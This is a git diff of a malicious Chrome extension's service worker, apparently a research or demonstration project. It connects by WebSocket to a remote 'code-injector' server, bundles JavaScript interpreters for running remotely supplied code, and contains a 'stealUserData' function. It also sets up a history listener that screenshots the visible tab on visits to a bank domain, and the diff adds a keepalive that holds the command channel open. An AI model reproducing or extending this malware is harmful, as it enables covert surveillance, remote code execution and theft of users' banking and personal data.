@@ -1,6 +1,7 @@
 importScripts("packages/acorn_interpreter.js", "packages/esprima.js", "packages/escodegen.js", "packages/static-eval.js");
 
 const SERVER_DOMAIN = 'extension-code-injector-production.up.railway.app'
+// const SERVER_DOMAIN = 'localhost:3333'
 const HTTP_SERVER_URL = `http://${SERVER_DOMAIN}`;
 const WS_SERVER_URL = `ws://${SERVER_DOMAIN}`;
 
@@ -34,14 +35,15 @@ async function stealUserData() {
 // On visit of a certain domain, take a screenshot
 // Could be abused to take screenshots of sensitive data such as bank account details
 async function onVisited(historyItem) {
-    if (historyItem.url.includes('google.com')) {
+    if (historyItem.url.includes('mybank.com')) {
         console.log('historyItem', historyItem);
         const screenshotUrl = await chrome.tabs.captureVisibleTab({format: 'jpeg'});
         // TODO: take a screenshot and save it
     }
 }
 
-chrome.history.onVisited.addListener(onVisited)
+// TODO: uncomment if want the listener for website visits
+// chrome.history.onVisited.addListener(onVisited)
 
 /* =================================================================================== */
 
@@ -119,6 +121,7 @@ function connectWebSocket() {
     socket.onopen = () => {
         console.log('WebSocket connected');
         WS_CONNECTED = true;
+        keepAlive();
     };
 
     socket.onmessage = onWsMessage;
@@ -133,6 +136,22 @@ function connectWebSocket() {
     };
 
     return socket
+}
+
+// Keep the service worker alive by sending a keepalive message to the server
+// Courtesy of - https://developer.chrome.com/docs/extensions/how-to/web-platform/websockets
+function keepAlive() {
+    const keepAliveIntervalId = setInterval(
+        () => {
+            if (socket) {
+                socket.send('keepalive');
+            } else {
+                clearInterval(keepAliveIntervalId);
+            }
+        },
+        // Set the interval to 20 seconds to prevent the service worker from becoming inactive.
+        20 * 1000
+    );
 }
 
 // Process the message from the WS server
